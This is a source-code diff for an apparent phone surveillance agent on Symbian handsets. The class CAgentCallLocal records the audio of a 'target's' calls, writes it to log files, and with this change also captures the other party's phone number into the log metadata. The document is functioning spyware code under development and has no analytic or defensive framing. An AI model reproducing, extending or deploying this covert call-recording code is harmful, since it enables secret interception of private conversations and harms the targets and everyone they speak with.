@@ -181,7 +181,7 @@ void CAgentCallLocal::MaiscOpenComplete(TInt aError)
 			delete iRecData;
 			iRecData = NULL;
 			}
-		iRecData = HBufC8::NewL(iBuffSize+20); //+20 = added phone number at start
+		iRecData = HBufC8::NewL(iBuffSize);
 			
 		// Set the data type (encoding)
         TRAPD(error, iInputStream->SetDataTypeL(iDefaultEncoding));
@@ -239,7 +239,7 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		if(aBuffer.Length())
 			{
 			iRecData->Des().Append(aBuffer);
-			if((iRecData->Size()+aBuffer.Size())>(iBuffSize-20)) 
+			if((iRecData->Size()+aBuffer.Size()) > iBuffSize) 
 				{
 				//this means that entire buffer has been filled
 				TTime now;
@@ -250,7 +250,6 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 				//we have to write log
 				if(!iBelowFreespaceQuota)
 					{
-					//iRecData->Des().Insert(0,iTelNum);
 					CLogFile* logFile = CLogFile::NewLC(iFs);
 					logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
 					logFile->AppendLogL(*iRecData);
@@ -279,7 +278,6 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 					
 			if(!iBelowFreespaceQuota)
 				{
-				//iRecData->Des().Insert(0,iTelNum);
 				CLogFile* logFile = CLogFile::NewLC(iFs);
 				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
 				logFile->AppendLogL(*iRecData);
@@ -317,6 +315,7 @@ void CAgentCallLocal::MaiscRecordComplete(TInt aError)
 		// TODO: user selected stop
     	// but as above this is never the case (at least on E71)... 
     	// only MaiscBufferCopied with KErrAbort
+    	// TODO: but this could be the case on N96 !!!! check
     	}
     else if(aError == KErrDied)  //KErrDied = -13
     	{
@@ -330,7 +329,7 @@ void CAgentCallLocal::MaiscRecordComplete(TInt aError)
         } 
     }
 
-void CAgentCallLocal::WriteFakeLog()
+void CAgentCallLocal::WriteFakeLogL()
 	{
 	TTime now;
 	now.UniversalTime();
@@ -351,8 +350,7 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 	
 	if(!iInCall)  //coz this could be a second call: a conference or second call after holding the first one
 		{
-		iTelNum.Copy(aNumber);
-		
+		TInt size = aNumber.Size();
 		iInCall = ETrue;
 		//fill additional data
 		TTime now;
@@ -360,25 +358,24 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 		TInt64 filetime = TimeUtils::GetFiletime(now);
 		iVoiceAdditionalData.highStartTime = (filetime >> 32);
 		iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
-		//TODO: add line info
 		//remember: despite variable names, caller is always the target, callee is always the other party
+		iVoiceAdditionalData.uCalleeIdLen = size;
+		iVoiceAdditionalData.uCallerIdLen = 0;
+		if(size!=0)
+			{
+			iVoiceAdditionalData.telNum.Copy(aNumber);
+			}
 		if(aDirection == CTelephony::EMobileOriginated)
 			{
 			//outgoing
-			iVoiceAdditionalData.uCalleeIdLen = 0;
-			iVoiceAdditionalData.uCallerIdLen = 0;
 			iVoiceAdditionalData.uIngoing = 0;
-			//see TSnapshotAdditionalData
 			}
 		else
 			{
 			//incoming
-			iVoiceAdditionalData.uCalleeIdLen = 0;
-			iVoiceAdditionalData.uCallerIdLen = 0; 
 			iVoiceAdditionalData.uIngoing = 1;
 			}
 		//start recording:
-		//TODO:check recorder ready
 		if(iRecState == EReady)
 			{
 			iInputStream->ReadL(*iStreamBufferArray[0]);
@@ -391,7 +388,7 @@ void CAgentCallLocal::NotifyDisconnectedCallStatusL()
 	{
 	iInCall = EFalse;
 	iInputStream->Stop();
-	//WriteFakeLog();
+	//WriteFakeLogL();
 	}
 
 
